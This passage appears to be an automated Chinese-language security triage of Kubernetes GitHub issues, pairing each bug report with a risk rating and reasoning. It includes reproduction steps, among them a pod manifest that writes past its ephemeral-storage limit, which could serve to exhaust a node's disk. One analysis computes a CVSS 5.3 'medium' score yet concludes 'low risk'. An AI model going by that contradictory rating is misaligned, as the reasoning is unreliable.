k8s.io/apimachinery/pkg/util/wait.JitterUntil(0xc001879f70, 0x3b9aca00, 0x0, 0x1, 0xc000d8a0c0)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:204 +0x7f
k8s.io/apimachinery/pkg/util/wait.Until(...)
        k8s.io/apimachinery/pkg/util/wait/backoff.go:161
k8s.io/client-go/tools/cache.(*processorListener).run(0xc000e41d40)
        k8s.io/client-go/tools/cache/shared_informer.go:972 +0x69
k8s.io/apimachinery/pkg/util/wait.(*Group).Start.func1()
        k8s.io/apimachinery/pkg/util/wait/wait.go:72 +0x52
created by k8s.io/apimachinery/pkg/util/wait.(*Group).Start in goroutine 8473
        k8s.io/apimachinery/pkg/util/wait/wait.go:70 +0x73
2024/11/05 20:54:53 running command: exit status 2


#### What did you expect to happen?

No crash

#### How can we reproduce it (as minimally and precisely as possible)?

build e2e.test and kubectl with kubernetes 1.31.1, and use "ginkgo“ to run the e2e test case as below:

./ginkgo --procs=1 --focus="should only target nodes with endpoints" --timeout=1h e2e.test -- \
       -kubeconfig ./kubeconfig -provider=local -num-nodes=2 -kubectl-path ./kubectl


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.31.1
Kustomize Version: v5.4.2
Server Version: v1.31.1

```

</details>


#### Cloud provider

<details>
N/A
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
PRETTY_NAME="Ubuntu 22.04.3 LTS"
NAME="Ubuntu"
VERSION_ID="22.04"
VERSION="22.04.3 LTS (Jammy Jellyfish)"
VERSION_CODENAME=jammy
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=jammy

$ uname -a
5.15.0-87-generic #97-Ubuntu SMP Mon Oct 2 21:09:21 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux


```

</details>


#### Install tools

<details>
k8s 1.31.1
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
# containerd --version
containerd containerd.io 1.6.33 d2d58213f83a351ca8f528a95fbd145f5654e957

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
这个Issue描述了在运行e2e测试时，kube-controller-manager（KCM）发生了崩溃，出现了nil pointer dereference的panic错误。根据堆栈信息，panic发生在`k8s.io/cloud-provider/controllers/service/controller.go:562`的`needsUpdate`函数中。这可能是由于处理Service资源时出现了空指针异常。

攻击者如果具备创建或修改Service资源的权限，可能通过构造特定的Service对象来触发该panic，导致kube-controller-manager崩溃，影响集群的控制平面服务。但是，触发该问题需要一定的权限，普通未授权攻击者难以利用。

根据风险判断标准，虽然存在潜在的DoS风险，但需要攻击者具备创建、修改等非只读权限，因此不应判断为高风险。

---

## Issue #128544 Warnings on missing pull secrets can be confusing

- Issue 链接：[#128544](https://github.com/kubernetes/kubernetes/issues/128544)

### Issue 内容

#### What happened?

A previous enhancement has added a warning event when a pull secret is missing: https://github.com/kubernetes/kubernetes/pull/117927

If the image has pulled successfully because either another pull secret did the job, or the image doesn't need auth, the warning is distracting.

As an example, this pod is running perfectly fine and has no problems, and yet when described, has had 11k warning events emitted over the last 9 days.
```
  Warning  FailedToRetrieveImagePullSecret  114s (x11399 over 9d)  kubelet  Unable to retrieve some image pull secrets (sa-integration); attempting to pull the image may not succeed.
```

We have been including multiple pull secrets in our pulls because it's more flexible to point to a few that may exist than to have to very exactly map each pod to a pull secret. This change means we will get warnings even when everything is working exactly as we wanted it to.

#### What did you expect to happen?

No warnings if an image is pulled successfully.

#### How can we reproduce it (as minimally and precisely as possible)?

Create a pod or service account that references a missing pull secret that is not required to pull the image.

#### Anything else we need to know?

My suggestion would be to only emit that warning if the image cannot be pulled (for example, reaches ImagePullBackOff), or to include the detail about the missing secret in the existing image pull failure events.

#### Kubernetes version

<details>

```console
Client Version: v1.29.4
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.29.8+632b078
```

</details>


#### Cloud provider

<details>
n/a
</details>


#### OS version

<details>

```console
n/a
```

</details>


#### Install tools

<details>
n/a
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
n/a
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>
n/a
</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
### 分析

该Issue描述了在Kubernetes中，当Pod或ServiceAccount引用了不存在的镜像拉取密钥（ImagePullSecret）时，即使镜像成功拉取，系统仍会产生大量的警告事件。这可能导致以下安全风险：

1. **日志膨胀与存储耗尽**：持续生成大量警告事件可能导致日志系统膨胀，消耗过多的存储空间，影响系统稳定性。

2. **拒绝服务（DoS）风险**：在多用户场景下，具有创建Pod权限的低权限用户可以通过创建引用不存在拉取密钥的Pod，故意生成大量警告事件，可能导致集群性能下降，甚至服务不可用。

根据风险判断标准：

- **第4条**：攻击者需要具备创建或修改Pod的权限，而不是只读权限，因此不应判断为高风险。
- **第9条**：虽然低权限用户可以影响集群性能，但影响范围主要限于自身权限范围内，未对更高权限的用户产生越权影响。
- **第10条**：Issue未涉及命令执行、容器逃逸、提权等高风险问题。

综上，风险评级判断为**低风险**。

**复现过程：**

```json
[
  {
    "cmd": "cat <<EOF | kubectl apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: test-pod\nspec:\n  containers:\n  - name: test\n    image: nginx\n  imagePullSecrets:\n  - name: missing-secret\nEOF",
    "explain": "创建一个引用不存在的镜像拉取密钥的Pod。"
  },
  {
    "cmd": "kubectl describe pod test-pod",
    "explain": "查看Pod的详细信息，可以看到关于缺失拉取密钥的警告事件。"
  },
  {
    "cmd": "kubectl get events --field-selector involvedObject.name=test-pod",
    "explain": "获取与test-pod相关的事件，验证产生的警告数量。"
  }
]
```

---

## Issue #128545 kubelet /metrics/slis endpoint gives 404 not found 

- Issue 链接：[#128545](https://github.com/kubernetes/kubernetes/issues/128545)

### Issue 内容

#### What happened?

A http get on kubelet `/metrics/slis` endpoint returns `404 page not found`

#### What did you expect to happen?

the `/metrics/slis` endpoint on kubelet (both the secure port 10250 and insecure port 10255) should return health check metrics, e.g.

```
# curl -k --cert /etc/kubernetes/pki/apiserver-kubelet-client.crt --key /etc/kubernetes/pki/apiserver-kubelet-client.key https://localhost:10250/metrics/slis
# HELP kubernetes_healthcheck [STABLE] This metric records the result of a single healthcheck.
# TYPE kubernetes_healthcheck gauge
kubernetes_healthcheck{name="log",type="healthz"} 1
kubernetes_healthcheck{name="ping",type="healthz"} 1
kubernetes_healthcheck{name="syncloop",type="healthz"} 1
# HELP kubernetes_healthchecks_total [STABLE] This metric records the results of all healthcheck.
# TYPE kubernetes_healthchecks_total counter
kubernetes_healthchecks_total{name="log",status="success",type="healthz"} 1
kubernetes_healthchecks_total{name="ping",status="success",type="healthz"} 1
kubernetes_healthchecks_total{name="syncloop",status="success",type="healthz"} 1
# HELP process_start_time_seconds [ALPHA] Start time of the process since unix epoch in seconds.
# TYPE process_start_time_seconds gauge
process_start_time_seconds 1.73015473685e+09
```

#### How can we reproduce it (as minimally and precisely as possible)?

have kubelet listen on both secure and insecure ports.

- restart kubelet and curl kubelet/metrics/slis on either one of the ports

Repeat multiple times and you'll see after some of the restarts, the endpoint returns 404 not found.

#### Anything else we need to know?

Root Cause: 

- the http server handler registration is wrapped so only runs [once](https://github.com/kubernetes/component-base/blob/v0.30.0/metrics/prometheus/slis/routes.go#L49)
- the [ListenAndServeKubeletServer](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/server.go#L153) and [ListenAndServeKubeletReadOnlyServer](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/server.go#L190) both calls the `NewServer` and then [slis.SLIMetricsWithReset{}.Install(s.restfulCont)](https://github.com/kubernetes/kubernetes/blob/v1.30.0/pkg/kubelet/server/server.go#L374) but only one of the 2 calls would run, resulting just one of the 2 ports handling the `/metrics/slis` endpoint
- depend on the start sequence of kubelet, there's a random-ness in which one would get the handler. So if you restart kubelet multiple times, you could see `/metrics/slis` available sometimes on https 10250 or sometimes on http 10255, but not both.

#### Kubernetes version

All past versions where /metrics/slis endpoint is available on kubelet


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue报告了kubelet的/metrics/slis接口有时会在重启后返回404错误。原因是由于在同时监听安全端口10250和不安全端口10255时，/metrics/slis接口可能只在其中一个端口上生效，而不是同时生效。由于不安全端口10255是未认证的，如果/metrics/slis接口暴露在不安全端口上，攻击者可以未经认证访问该接口，获取到健康检查相关的metrics信息。虽然这些metrics信息敏感性较低，但仍存在一定的信息泄露风险。

根据CVSS 3.1标准进行评分：

- **攻击向量（AV）**：网络（N）
- **攻击复杂度（AC）**：低（L）
- **权限要求（PR）**：无（N）
- **用户交互（UI）**：无（N）
- **作用范围（S）**：未改变（U）
- **机密性影响（C）**：低（L）
- **完整性影响（I）**：无（N）
- **可用性影响（A）**：无（N）

综合得分为**5.3**，属于中等风险。因此，判断为**低风险**。

---

## Issue #128500 Anonymous volumes not counted against pod ephemeral-storage limits

- Issue 链接：[#128500](https://github.com/kubernetes/kubernetes/issues/128500)

### Issue 内容

#### What happened?

Hi, not sure if this is the correct place to report, but we're seeing an issue between K8s and containerd with tracking disk usage against ephmeral-storage limits.

We have K8s (AWS EKS) v1.26.15 with containerd 1.7.22 running on Amazon Linux 2 with cgroups v1.  If you apply the below K8s manifest you should get a pod that uses around 1 GiB of disk in either an anonymous volume (coming from the VOLUME instruction in the Dockerfile that created the image), or by switching to alternate value of `DEST_DIR` the container root file system or a named volume.

For the container root filesystem, I see the usage briefly appear in `crictl stats` before the pod is evicted due to exceeding its `ephemeral-storage` limit.  For the named volume, `crictl stats` stays at zero but the pod is similarly killed.  However for the anonymous volume case `crictl stats` stays similarly on zero but the pod remains running, as presumably K8s is not counting the usage towards the total.

While I can see both volumes in `crictl inspect` under status/mounts I'm not sure if containerd/cri or the kubelet is meant to be reporting the disk usage of volumes.  `kubectl get --raw /api/v1/nodes/$MY_NODE/proxy/stats` only shows the named volume, not anonymous ones.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: test-es-limit
  namespace: default
spec:
  nodeSelector:
    kubernetes.io/os: linux
    kubernetes.io/arch: amd64
  terminationGracePeriodSeconds: 1
  containers:
    - name: test
      image: postgres
      env:
        - name: DEST_DIR
          value: /var/lib/postgresql/data # Anon volume
          # value: /var/lib/misc # Container root fs
          # value: /data # Named volume
        - name: BIG_FILE
          value: /usr/lib/postgresql/17/bin/postgres # 9.6 MiB
      command:
        - bash
        - -c
        - "for RUN in {1..100}; do cp $BIG_FILE $DEST_DIR/dummy.$RUN ; done ; du -sh $DEST_DIR ; sleep 5000"
      resources:
        limits:
          cpu: 100m
          ephemeral-storage: 200Mi # Script uses almost 1 GiB
          memory: 128Mi
        requests:
          cpu: 100m
          ephemeral-storage: 200Mi
          memory: 128Mi
      volumeMounts:
        - name: named-storage
          mountPath: /data
  volumes:
    - name: named-storage
      emptyDir: {}
```

#### What did you expect to happen?

For the pod described by the above YAML to get Evicted as using over storage limits

#### How can we reproduce it (as minimally and precisely as possible)?

See included pod YAML

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>
v1.26.15
</details>


#### Cloud provider

<details>
AWS - EKS v1.26
</details>


#### OS version

<details>

```console
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"

Linux HOSTNAME 5.10.226-214.880.amzn2.x86_64 #1 SMP Tue Oct 8 16:18:15 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux


```
</details>


#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

<details>
containerd 1.7.22
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### 分析结果

**风险定级：**  
低风险

**判断依据：**  
该Issue描述了在Kubernetes环境下，当Pod使用匿名卷（比如在Dockerfile中使用VOLUME指令创建的卷）时，其磁盘使用量未被计算到Pod的ephemeral-storage限制中。这可能导致Pod能够使用超过其存储限制的磁盘空间，从而可能耗尽节点的磁盘资源，影响其他Pod的正常运行，造成拒绝服务（DoS）攻击。

根据风险判断标准，第4条指出：

"在风险为拒绝服务（DoS）攻击时，如果攻击者需要一定权限才能够实施该攻击，则视情况需要降级处理，当漏洞利用需要攻击者具备创建、修改等非只读权限时，则不应判断为高风险，CVSS评级在high以下。"

在此情境下，攻击者需要具备在集群中创建或修改Pod的权限才能利用该漏洞。因此，该风险不应被评估为高风险，而应被评估为低风险。

---

# ✅ 不涉及安全风险的 Issues (45 个)

## Issue #129024 informer.AddEventHandler: handle.HasSynced always returns false after panic

- Issue 链接：[#129024](https://github.com/kubernetes/kubernetes/issues/129024)

### Issue 内容

#### What happened?

I was testing something roughly like this:

```golang
informer := NewSharedInformer(source, &v1.Pod{}, 1*time.Second)
go informer.RunWithContext(ctx)
require.Eventually(t, informer.HasSynced, time.Minute, time.Millisecond, "informer has synced")

handler := ResourceEventHandlerFuncs{
			AddFunc: func(obj any) {
				panic("fake panic")
			},
		}

handle, err := informer.AddEventHandlerWithContext(ctx, handler, HandlerOptions{})
require.NoError(t, err)
require.Eventually(t, handle.HasSynced, time.Minute, time.Millisecond, "handler has synced")
```

This times out waiting for the handler to sync.

#### What did you expect to happen?

`handle.HasSynced` = `ResourceEventHandlerRegistration.HasSynced` should return true eventually.

#### How can we reproduce it (as minimally and precisely as possible)?

I'll have a full reproducer in one of my PRs soon.

#### Anything else we need to know?

/sig api-machinery


#### Kubernetes version

master ~= 1.32


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了在测试过程中，当事件处理器的AddFunc函数发生panic时，handle.HasSynced始终返回false的问题。这属于程序的异常处理和错误恢复机制的问题。从安全风险的角度来看，这种panic是由代码内部的错误引起的，攻击者无法通过外部手段触发或利用这个panic。根据风险判断标准第3条和第10条，此问题不涉及安全风险。

---

## Issue #129016 Kubelet takes more than 10 minutes to pull up the pod

- Issue 链接：[#129016](https://github.com/kubernetes/kubernetes/issues/129016)

### Issue 内容

#### What happened?

Kubelet takes more than 10 minutes to pull up the pod，After adding logs for localization, it was found that it was `dswp.podManager.GetPods()` in  `findAndAddNewPods()`  method did not obtain the corresponding pod, suspecting that there is a problem with obtaining the lock. Causing waitForVolumeAttach (volumeToMount cache. VolumeToMount) to start slowly
`pkg/kubelet/volumemanager/populator/desired_state_of_world_populator.go   findAndAddNewPods() `

#### What did you expect to happen?

After the pod is scheduled, operationExecutor.VerifyControlerAttachedVolume can start normally

#### How can we reproduce it (as minimally and precisely as possible)?

Resolve the issue where GetPods() cannot access all pods

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```
v1.28.1
</details>


#### Cloud provider

<details>
na
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
该Issue描述了Kubelet在拉起Pod时耗时超过10分钟，怀疑`findAndAddNewPods()`方法中的`dswp.podManager.GetPods()`未获取到对应的Pod，可能存在锁获取的问题，导致`waitForVolumeAttach`启动缓慢。这是一个性能问题，可能影响系统的效率和稳定性。但根据风险判断标准第6条：**如果Issue不涉及安全问题，则风险评级判断为不涉及**。因此，此Issue不涉及安全风险。

---

## Issue #129014 About `The connection to the server localhost:8080 was refused - did you specify the right host or port?`

- Issue 链接：[#129014](https://github.com/kubernetes/kubernetes/issues/129014)

### Issue 内容

#### What happened?

Overall, after executing `kubeadm init` on the master and joining the cluster on node1, executing `kubectl get pods` shows:
```
[root@master ~]# kubectl get pods   
E1128 11:13:17.569545   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.569946   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.573246   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.574176   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.579695   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
The connection to the server localhost:8080 was refused - did you specify the right host or port?
```

#### What did you expect to happen?

Overall, after executing `kubeadm init` on the master and joining the cluster on node1, executing `kubectl get pods` shows:
```
[root@master ~]# kubectl get pods   
E1128 11:13:17.569545   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.569946   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.573246   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.574176   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
E1128 11:13:17.579695   10984 memcache.go:265] couldn't get current server API group list: Get "http://localhost:8080/api?timeout=32s": dial tcp [::1]:8080: connect: connection refused
The connection to the server localhost:8080 was refused - did you specify the right host or port?
```

#### How can we reproduce it (as minimally and precisely as possible)?

Normal installation of k8s, initializing the master and adding node1 to the cluster

#### Anything else we need to know?

I am from China（english bad🙏）, so I used a mirror source to pull
The k8s and docker packages are pulled using a proxy:
```
cat > /etc/yum.repos.d/kubernetes.repo << EOF
[kubernetes]
name=Kubernetes
baseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/
enabled=1
gpgcheck=1
repo_gpgcheck=1
gpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg
EOF
```

#### Kubernetes version

<details>

```console
[root@master ~]# kubectl version
Client Version: v1.28.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
```

</details>


#### Cloud provider

<details>
VMware worstation
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
[root@master ~]# cat /etc/os-release
NAME="Rocky Linux"
VERSION="9.2 (Blue Onyx)"
ID="rocky"
ID_LIKE="rhel centos fedora"
VERSION_ID="9.2"
PLATFORM_ID="platform:el9"
PRETTY_NAME="Rocky Linux 9.2 (Blue Onyx)"
ANSI_COLOR="0;32"
LOGO="fedora-logo-icon"
CPE_NAME="cpe:/o:rocky:rocky:9::baseos"
HOME_URL="https://rockylinux.org/"
BUG_REPORT_URL="https://bugs.rockylinux.org/"
SUPPORT_END="2032-05-31"
ROCKY_SUPPORT_PRODUCT="Rocky-Linux-9"
ROCKY_SUPPORT_PRODUCT_VERSION="9.2"
REDHAT_SUPPORT_PRODUCT="Rocky Linux"
REDHAT_SUPPORT_PRODUCT_VERSION="9.2"
$ uname -a
[root@master ~]# uname -a
Linux master 5.14.0-284.11.1.el9_2.x86_64 #1 SMP PREEMPT_DYNAMIC Tue May 9 17:09:15 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

</details>


#### Install tools

<details>
yum / dnf
</details>


#### Container runtime (CRI) and version (if applicable)

<details>
[root@master ~]# containerd version
INFO[2024-11-28T11:20:37.912365123+08:00] starting containerd                           revision=57f17b0a6295a39009d861b89e3b3b87b005ca27 version=1.7.23
</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
从提供的Issue内容来看，用户在执行`kubectl get pods`时，出现了`The connection to the server localhost:8080 was refused - did you specify the right host or port?`的错误。这通常是由于Kubernetes客户端未正确配置与API服务器的连接，或者缺少必要的配置文件（如`~/.kube/config`）所导致的。这是一个常见的配置问题，与安全风险无关。

根据风险判断标准，此Issue没有提及任何可能被攻击者利用的安全漏洞，不存在高风险的安全问题。因此，风险评级判断为不涉及。

---

## Issue #129012 The current and desired number of replicas in the sample controller is incorrect.

- Issue 链接：[#129012](https://github.com/kubernetes/kubernetes/issues/129012)

### Issue 内容

#### What happened?

The current and desired number of replicas in the sample controller is incorrect.

`Say, we have the replicas of the crd start with 1 and change to 2.`

we got this:
`"Update deployment resource" objectRef="default/example-foo" currentReplicas=2 desiredReplicas=1`

![image](https://github.com/user-attachments/assets/536045c1-74e5-4321-83f9-6074fa878751)


#### What did you expect to happen?

When updating the replicas of the crd and the log level set to 4, the log should show `current 1, desired 2`.



#### How can we reproduce it (as minimally and precisely as possible)?

- Run sample controller and set log level to 4
- Apply crd.yaml and `example-foo.yaml` file in artifacts folder
- Change the replicas of `example-foo.yaml` from 1 to 2 and apply the changes


#### Anything else we need to know?

_No response_

#### Kubernetes version
<details>
```console
$ kubectl version
v1.28.1
```

</details>


#### Cloud provider

<details>
Local cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，这是一个关于Sample Controller在更新CRD（自定义资源定义）时，当前和期望的副本数显示不正确的问题。具体来说，当将CRD的副本数从1更改为2时，日志中显示的currentReplicas和desiredReplicas与预期不符。这是一个功能性错误或日志显示错误。

根据风险判断标准：

1. 该问题并不能被攻击者利用来实施攻击，不符合标准1。
2. 没有迹象表明该问题可能成为一个漏洞，也不涉及CVSS评分，不符合标准2。
3. 该问题不是由于Issue提交者的敏感信息泄露或不当操作导致，标准3不适用。
4. 该问题不会导致拒绝服务攻击，标准4不适用。
5. 不涉及凭据泄露，标准5不适用。
6. 根据标准6，如果Issue不涉及安全问题，则风险评级判断为“不涉及”。

综上所述，该Issue不涉及安全风险。

---

## Issue #129001 failed to get api resources with kubectl 1.30

- Issue 链接：[#129001](https://github.com/kubernetes/kubernetes/issues/129001)

### Issue 内容

#### What happened?

we installed Istio CRD within standard container to perform some upgrade test, mainly the installation below CRD 

```
apiVersion: networking.istio.io/v1alpha3
kind: VirtualService
metadata:
  name: fortio
spec:
  hosts:
  - '*'
  gateways:
  - fortio-gateway
  http:
  - route:
    - destination:
        host: fortio
        port:
          number: 8080
---
apiVersion: networking.istio.io/v1alpha3
kind: Gateway
metadata:
  name: fortio-gateway
spec:
  selector:
    istio: ingressgateway
  servers:
  - hosts:
    - '*'
    port:
      name: http
      number: 80
      protocol: HTTP`
```

it depends on the api resources to be available, while the default kubelctl is 1.30, it does not list the api-resources with "Istio"
```
bash-4.4$ kubectl api-resources |grep istio
bash-4.4$ 
```
while if I change to use a 1.29 kubectl, it will list the istio api-resources; then I run with 1.30 kubectl again, it can get the Istio api resources as well. But if I don't run the 1.29 kubect, we kee retry, it take 10 + mins to get the Istio api -resources using 1.30 kubectl. 


```
bash-4.4$ /tmp/kubectl.129 api-resources |grep istio
adapters                                         config.istio.io/v1alpha2          true         adapter
attributemanifests                               config.istio.io/v1alpha2          true         attributemanifest
handlers                                         config.istio.io/v1alpha2          true         handler
httpapispecbindings                              config.istio.io/v1alpha2          true         HTTPAPISpecBinding
httpapispecs                                     config.istio.io/v1alpha2          true         HTTPAPISpec
instances                                        config.istio.io/v1alpha2          true         instance
quotaspecbindings                                config.istio.io/v1alpha2          true         QuotaSpecBinding
quotaspecs                                       config.istio.io/v1alpha2          true         QuotaSpec
rules                                            config.istio.io/v1alpha2          true         rule
templates                                        config.istio.io/v1alpha2          true         template
wasmplugins                                      extensions.istio.io/v1alpha1      true         WasmPlugin
destinationrules                    dr           networking.istio.io/v1beta1       true         DestinationRule
envoyfilters                                     networking.istio.io/v1alpha3      true         EnvoyFilter
gateways                            gw           networking.istio.io/v1beta1       true         Gateway
proxyconfigs                                     networking.istio.io/v1beta1       true         ProxyConfig
serviceentries                      se           networking.istio.io/v1beta1       true         ServiceEntry
sidecars                                         networking.istio.io/v1beta1       true         Sidecar
virtualservices                     vs           networking.istio.io/v1beta1       true         VirtualService
workloadentries                     we           networking.istio.io/v1beta1       true         WorkloadEntry
workloadgroups                      wg           networking.istio.io/v1beta1       true         WorkloadGroup
rbacconfigs                                      rbac.istio.io/v1alpha1            true         RbacConfig
servicerolebindings                              rbac.istio.io/v1alpha1            true         ServiceRoleBinding
serviceroles                                     rbac.istio.io/v1alpha1            true         ServiceRole
authorizationpolicies                            security.istio.io/v1beta1         true         AuthorizationPolicy
peerauthentications                 pa           security.istio.io/v1beta1         true         PeerAuthentication
requestauthentications              ra           security.istio.io/v1beta1         true         RequestAuthentication
telemetries                         telemetry    telemetry.istio.io/v1alpha1       true         Telemetry
```


#### What did you expect to happen?

There shall be no delay of 10+ mins by using the 1.30 kubectl to get the api resoures

#### How can we reproduce it (as minimally and precisely as possible)?

1. running from docker container
```
docker --version
Docker version 24.0.7, build 24.0.7-0ubuntu2~22.04.1
```
2. install Istio api-resources
3. using 1.30 kubectl to get the Istio api -resources
```
kubectl api-resources |grep istio
```

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.7
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.1

```

</details>


#### Cloud provider

<details>
Kubeadm brought up cluster
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
不涉及

**判断依据：**  
根据提供的Issue内容，用户在安装了Istio的CRD后，使用1.30版本的kubectl无法立即获取到Istio的API资源，而使用1.29版本的kubectl可以正常获取。经过一段时间后，1.30版本的kubectl也可以获取到Istio的API资源。该问题描述了kubectl在不同版本下获取CRD资源的行为差异。

根据风险判断标准，该Issue未涉及安全问题，未描述任何可以被攻击者利用的安全风险。

---

## Issue #128993 [InPlacePodVerticalScaling]kubelet sometimes set `.status.resize` incorrectly

- Issue 链接：[#128993](https://github.com/kubernetes/kubernetes/issues/128993)

### Issue 内容

#### What happened?

In cluster which enable InPlacePodVerticalScaling, If I only resize resources, I will watch `.status.resize` and `.status.containerStatuses[x].resources` to know whether the resize progress.

I have encountered some corner cases that are difficult to consistently reproduce:
1. User changes cpu request from 200m to 100m
2. Kubelet set  `.status.resize` to `InProgress`
3. Kubelet set `.status.resize` to be nil and set `.status.containerStatuses[x].resources` to be 100m
4. Kubelet set `.status.resize` to be `InProgress` and set `.status.containerStatuses[x].resources` to be 200m
5. finally,  Kubelet set `.status.resize` to be nil and set `.status.containerStatuses[x].resources` to be 100m again

#### What did you expect to happen?

Under normal circumstances, steps 4 and 5 should not take place.

I have discovered some relevant information in the Kubelet logs.

// step 2
```log
Nov 12 10:15:53 iZbp12y2uyns2wwzue952tZ kubelet[12114]: I1112 10:15:53.062599   12114 status_manager.go:874] "Patch status for pod" pod="e2e-tests-inplace-vpa-dn82w/clone-plf57qc7jx-csxgn" podUID="1cb463b9-8fbe-4d1f-a8ac-277d981684cd" patch="{\"metadata\":{\"uid\":\"1cb463b9-8fbe-4d1f-a8ac-277d981684cd\"},\"status\":{\"containerStatuses\":[{\"allocatedResources\":{\"cpu\":\"100m\",\"memory\":\"100Mi\"},\"containerID\":\"containerd://f674d36be2e4a13a47a66a1763e1d5bf315e08dba3c7d36e63169b9e1fefe8cb\",\"image\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx:alpine\",\"imageID\":\"registry.cn-hangzhou.aliyuncs.com/abner1/nginx@sha256:e3c23d48c0a8ae0021a66c65fd9218608572e2746e6b923b9ddbcb89f29ef128\",\"lastState\":{},\"name\":\"nginx\",\"ready\":true,\"resources\":{\"limits\":{\"cpu\":\"1\",\"memory\":\"1Gi\"},\"requests\":{\"cpu\":\"200m\",\"memory\":\"200Mi\"}},\"restartCount\":0,\"started\":true,\"state\":{\"running\":{\"startedAt\":\"2024-11-12T02:15:50Z\"}}}],\"resize\":\"InProgress\"}}"
